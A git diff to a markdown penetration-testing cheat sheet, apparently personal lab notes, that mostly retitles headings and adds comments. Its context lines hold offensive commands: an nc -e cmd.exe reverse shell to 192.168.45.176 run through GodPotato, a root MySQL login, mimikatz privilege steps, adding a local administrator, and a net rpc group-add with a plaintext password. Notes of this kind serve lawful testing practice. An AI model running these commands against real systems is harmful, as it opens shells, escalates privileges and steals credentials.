@@ -202,9 +202,12 @@ fodhelper.exe
 
 
 # SQL
-## MYSQL
+## MYSQL: Check if MYSQL is running with privileged account..!
 ```bash
+# mysql login
 mysql -u 'root' -h 192.168.183.122 -p
+
+# general usage
 show databases;
 use user;
 show tables;
@@ -554,7 +557,7 @@ Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
 .\GodPotato.exe -cmd ".\revshell7777.exe"
 .\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
 ```
-## mimikatz
+### mimikatz
 ```bash
 privilege::debug
 token::elevate
@@ -634,7 +637,10 @@ net localgroup administrators nuri /add
 ```bash
 <Add user to Remote Access group on kali linux using net> 
 net rpc group addmem "REMOTE ACCESS" "Tracy.White" -U nara-security.com/Tracy.White%zqwj041FGX -S 192.168.193.30 
+```
 
+### PrivestCheck
+```bash
 ```
 
 # SSH
